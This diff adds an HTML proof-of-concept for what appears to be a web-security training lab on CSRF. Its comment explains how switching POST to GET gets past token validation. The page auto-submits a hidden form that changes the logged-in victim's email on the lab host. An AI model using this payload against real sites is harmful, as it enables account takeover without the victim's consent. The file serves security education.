@@ -1,0 +1,31 @@
+<html>
+    <body>
+        <!--
+            Lab #2 CSRF where token validation depends on request method
+
+            Vulnerable parametr - email change functionality
+
+            Goal - exploit CSRF to change email address
+
+            Creds - wiener:peter
+
+            Analysis:
+            In order for a CSRF attack to be possible:
+            - A relevant action: change a users email
+            - Cookie-based session handlinf: session cookie
+            - No unpredictable request parameter (Is CSRF token): Request method can be changed to GET which does not require CSRF token
+            CSRF Token is used for POST method.
+
+            Testing CSRF Tokens:
+            1. Change the request method from POST to GET
+        -->
+        <script>history.pushState('', '', '/')</script>
+        <form action="https://acfd1f091ebb87a2c0ba4749007b004c.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="sarlot@hacker.com"/>
+            <input type="submit" value="Submit request"/>
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
